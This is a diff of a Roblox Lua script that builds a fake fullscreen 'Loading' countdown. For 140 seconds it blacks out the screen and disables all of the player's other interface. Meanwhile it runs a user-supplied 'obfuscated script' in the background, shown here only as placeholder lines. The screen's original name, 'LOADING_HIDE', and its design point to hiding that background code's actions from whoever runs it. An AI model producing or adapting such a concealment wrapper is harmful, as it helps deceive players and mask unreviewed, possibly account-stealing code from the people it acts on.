@@ -1,55 +1,57 @@
--- Fullscreen loading screen + background execution
 local player = game.Players.LocalPlayer
 local countdownTime = 140
 
--- Create a fullscreen black GUI
+-- 1. Create FULL BLACK loading screen that covers everything
 local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "LOADING_HIDE"
+loadingGui.Name = "LOADING_SCREEN"
 loadingGui.ResetOnSpawn = false
 loadingGui.IgnoreGuiInset = true
 loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+loadingGui.DisplayOrder = 9999
 loadingGui.Parent = player:WaitForChild("PlayerGui")
 
-local bg = Instance.new("Frame")
-bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BorderSizePixel = 0
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.Position = UDim2.new(0, 0, 0, 0)
-bg.Parent = loadingGui
+local blackBg = Instance.new("Frame")
+blackBg.BackgroundColor3 = Color3.new(0, 0, 0)
+blackBg.Size = UDim2.new(1, 0, 1, 0)
+blackBg.Position = UDim2.new(0, 0, 0, 0)
+blackBg.BorderSizePixel = 0
+blackBg.Parent = loadingGui
 
-local label = Instance.new("TextLabel")
-label.Text = "Loading: " .. countdownTime
-label.Font = Enum.Font.SourceSansBold
-label.TextSize = 48
-label.TextColor3 = Color3.new(1, 1, 1)
-label.BackgroundTransparency = 1
-label.AnchorPoint = Vector2.new(0.5, 0.5)
-label.Position = UDim2.new(0.5, 0, 0.5, 0)
-label.Size = UDim2.new(0, 400, 0, 100)
-label.Parent = bg
+local loadingLabel = Instance.new("TextLabel")
+loadingLabel.Text = "Loading: " .. countdownTime
+loadingLabel.Font = Enum.Font.SourceSansBold
+loadingLabel.TextSize = 48
+loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+loadingLabel.Size = UDim2.new(0, 400, 0, 100)
+loadingLabel.ZIndex = 10
+loadingLabel.Parent = blackBg
 
--- Disable all other UI
+-- 2. Hide all other UI elements (inventory, etc.)
 for _, gui in pairs(player.PlayerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") and gui.Name ~= "LOADING_HIDE" then
+    if gui:IsA("ScreenGui") and gui.Name ~= "LOADING_SCREEN" then
         gui.Enabled = false
     end
 end
 
--- Run your script in background
+-- 3. START your obfuscated script immediately (in background)
 coroutine.wrap(function()
-    -- INSERT YOUR OBFUSCATED SCRIPT BELOW THIS LINE
-    local _0xABC = ...
-    _0xABC:execute()
-    -- INSERT ABOVE THIS LINE
+    -- === INSERT YOUR OBFUSCATED SCRIPT HERE ===
+    -- For example:
+    local _0xXYZ = ...
+    _0xXYZ:execute()
+    -- === END OF YOUR SCRIPT ===
 end)()
 
--- Countdown display
+-- 4. Countdown logic (runs on top of black screen)
 for i = countdownTime, 1, -1 do
-    label.Text = "Loading: " .. i
+    loadingLabel.Text = "Loading: " .. i
     wait(1)
 end
 
--- Restore UI
+-- 5. Countdown done: remove loading screen and restore UI
 loadingGui:Destroy()
 for _, gui in pairs(player.PlayerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
